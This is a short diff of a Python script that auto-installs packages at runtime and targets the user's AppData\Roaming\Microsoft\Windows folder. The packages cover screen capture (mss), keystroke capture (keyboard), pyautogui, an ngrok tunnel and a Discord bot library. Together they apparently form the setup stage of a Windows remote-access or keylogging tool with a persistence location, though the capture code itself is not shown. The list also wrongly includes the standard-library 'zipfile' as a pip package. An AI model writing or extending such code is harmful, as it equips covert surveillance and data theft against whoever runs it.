@@ -1,9 +1,28 @@
-import subprocess
-import zipfile
 import os
-import shutil
+import subprocess
+import sys
+
+required_packages = [
+    'flask', 'flask-socketio', 'opencv-python-headless', 'numpy', 'mss',
+    'pyngrok', 'pyautogui', 'Pillow', 'nextcord', 'requests',
+    'keyboard', 'python-dateutil', 'pywin32', 'zipfile'
+]
+
+# Function to install packages
+def install_packages():
+    try:
+        # Loop through and install each package using pip
+        for package in required_packages:
+            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
+        print("All packages installed successfully!")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to install {e.cmd}. Error: {e}")
+
+# Call the function to install packages
+install_packages()
+
 import requests
-import time
+import zipfile
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
